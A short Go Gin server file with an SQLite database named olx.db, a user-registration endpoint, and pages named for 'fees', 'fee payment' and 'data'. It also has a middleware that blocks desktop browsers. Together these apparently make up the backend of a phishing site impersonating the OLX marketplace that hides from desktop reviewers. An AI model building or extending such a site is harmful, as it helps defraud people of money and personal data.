package main

import (
	"database/sql"
	"log"
	"main/controllers"
	"main/db"
	"main/routes"
	"net/http"

	"github.com/gin-gonic/gin"
	_ "github.com/mattn/go-sqlite3"
)

func main() {
	r := gin.Default()

	dbConn, err := sql.Open("sqlite3", "./olx.db")
	if err != nil {
		log.Fatal(err)
	}
	defer dbConn.Close()

	queries := db.New(dbConn)

	// Endpoint user
	r.POST("/cadastrar", func(c *gin.Context) {
		var usuario db.CriarUsuarioParams

		// Decodificar o JSON enviado pelo frontend
		if err := c.ShouldBindJSON(&usuario); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Erro ao decodificar os dados"})
			return
		}

		// Inserir o usuário no banco de dados
		if err := queries.CriarUsuario(c.Request.Context(), usuario); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Erro ao cadastrar usuário: " + err.Error()})
			return
		}

		// Retornar resposta de sucesso
		c.JSON(http.StatusOK, gin.H{"success": true})

	})

	// Middleware
	r.Use(controllers.BlockDesktopBrowsers)
	// Serve static files from the img directory
	r.Static("/img", "./img")

	// Serve the index.html file
	r.LoadHTMLFiles("./public/index.html", "./public/taxa.html", "./public/importante.html", "./public/inicial.html", "./public/dados.html", "./public/pagamento-taxa.html", "./public/inicial.html")

	routes.SetupRoutes(r)

	// Start the server
	r.Run(":8080")
}
